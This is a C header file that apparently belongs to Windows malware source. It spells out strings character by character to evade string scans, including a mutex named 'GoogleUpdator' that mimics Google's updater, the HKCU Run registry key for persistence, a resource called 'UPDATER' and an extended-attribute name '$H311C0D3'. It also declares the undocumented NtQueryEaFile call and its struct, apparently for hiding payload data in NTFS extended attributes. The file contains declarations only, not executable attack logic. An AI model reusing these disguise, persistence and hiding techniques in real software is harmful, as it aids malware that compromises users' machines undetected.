#pragma once
#ifndef HELPER_H_
#define HELPER_H_

#include <stdio.h>

// TODO: Add helper print function for testing:
// https://stackoverflow.com/a/1644898


#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NT_ERROR(Status)   ((((ULONG)(Status)) >> 30) == 3)
const TCHAR MUTEX_NAME[] = { 'G','o','o','g','l','e','U','p','d','a','t','o','r',0 };
const TCHAR RUN_KEY[] = { 'H','K','E','Y','_','C','U','R','R','E','N','T','_','U','S','E','R','\\','S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n',0 };
const TCHAR NTDLL[] = { 'n','t','d','l','l',0 };
const TCHAR NT_QUERY_EA_FILE[] = { 'N','t','Q','u','e','r','y','E','a','F','i','l','e',0 };
const TCHAR LOG_FILE_PATH[] = { 'd','b','.','l','o','g',0 };
const TCHAR ATTRIBUTE_NAME[] = { '$','H','3','1','1','C','0','D','3',0 };
const TCHAR RESOURCE_NAME[] = { 'U','P','D','A','T','E','R',0 };

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

/*
 * http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/File/NtQueryEaFile.html
*/
typedef NTSTATUS(WINAPI* pNtQueryEaFile)(
	_In_ HANDLE FileHandle,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_ PVOID Buffer,
	_In_ ULONG Length,
	_In_ BOOLEAN ReturnSingleEntry,
	_In_ PVOID EaList,
	_In_ ULONG EaListLength,
	_In_opt_ PULONG EaIndex,
	_In_ BOOLEAN RestartScan
	);

/*
 * http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/File/FILE_FULL_EA_INFORMATION.html
*/
typedef struct _FILE_FULL_EA_INFORMATION {
	ULONG NextEntryOffset;
	BYTE Flags;
	BYTE EaNameLength;
	USHORT EaValueLength;
	CHAR EaName[1];

} FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;

#endif /* HELPER_H_ */
